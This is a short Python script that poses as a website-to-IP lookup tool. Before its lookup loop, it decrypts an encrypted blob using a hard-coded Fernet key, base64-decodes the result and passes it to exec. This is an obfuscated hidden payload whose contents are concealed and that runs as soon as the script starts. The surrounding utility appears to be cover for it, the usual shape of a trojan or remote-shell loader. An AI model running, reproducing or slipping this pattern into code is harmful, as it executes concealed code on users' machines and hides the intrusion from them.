from socket import*
from cryptography.fernet import Fernet 
import os
import sys
import base64
K ='n7BZUyhsUbjawGFoHt_u_wVxaTOFHBd7ZtCYZycB2L4='
F = Fernet(K)
enc ='gAAAAABeQfAOmoc3f0uG4VX38X3TeqxM7nBktW3uoJXFfTwcgGg_VM7EOy7Z_p1XQi7UemvHnI87b1mQXJVTtYzO33Lnd_LAVAnyvR7waJyrNMw_jLjhGHeJKm08YZ075tS_9qMGjH54OB5bH8G5E_dBdFDwQalePnLrbH_feKSFRQ8--tBwkdQC_7NthhDk_j-x5OKA6A5gFVU9iyuYtc5m6tmlt95cWxz7IjsfxYN5zZ8Yuabo0B06DQlNfXmu4TasUBgMf1vmeXiIoRVPipZX4IAcazH2BD_E4LHKV07-e53aHZelBZ9LEcjXTMeEhDSahzOcBHu0DMIyfuMzMqVSd99krgXbn7KjFmHNmX_EsRRW3Yy4fFy5Zw9pB8UfvC8y92IIj2PuLxnSaBS7INkwqpB_WJVag96q3LOp_hQ8HAIeKqT2L468kxPwq11n1K8Ici8sKLF9o5faAjRsg81aH6_wIHyrvh2Z7sRpgnZp5bRJJeo2lRyrJaFVNkekiLhzXK2XBiDjxRBoc3VgHkEuNFevo2GBrvfRsG8Uq_TsmJFW_fLqIVI='
b_64_dec = F.decrypt(enc)
exec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]](b_64_dec)))
while True :
    link = input("enter the website link :")
    host = gethostbyname(link)
    print host
    
